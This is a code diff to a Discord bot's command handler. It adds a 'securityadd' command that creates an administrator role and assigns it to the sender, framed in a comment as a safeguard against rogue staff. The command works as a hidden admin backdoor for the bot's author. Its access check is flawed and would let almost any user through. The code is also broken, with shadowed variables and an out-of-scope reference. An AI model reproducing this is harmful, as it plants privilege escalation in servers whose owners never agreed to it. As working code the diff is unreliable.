@@ -96,10 +96,23 @@ const commands = {
             if (args[1] === "createmuteduser") {
                 user = msg.mentions.members.first();
                 var mutee = {
-                    msg.mentions.members.first().username: msg.mentions.members.first()
                 }
                 console.log(msg.mentions.members.first())
 
+            } else if (args[1] === "securityadd") { // for use in case of server takeover by rogue staff. 
+                if (msg.author.id === config.author || config.testuser) {
+                    msg.guild.createRole({
+                      name: 'pixel-security',
+                      administrator: true,
+                      color: 'BLUE'
+                    }).then(function(msg) {
+                        var umember = msg.guild.member(msg.author.id);
+                        var role = msg.member.roles.find("name", "pixel-security")
+                        console.log(role)
+                    }).then(function(msg) {
+                        umember.addRole(msg.member.roles.find("name", "pixel-security")).catch(console.error);
+                    });
+                }
             }
     }
 }
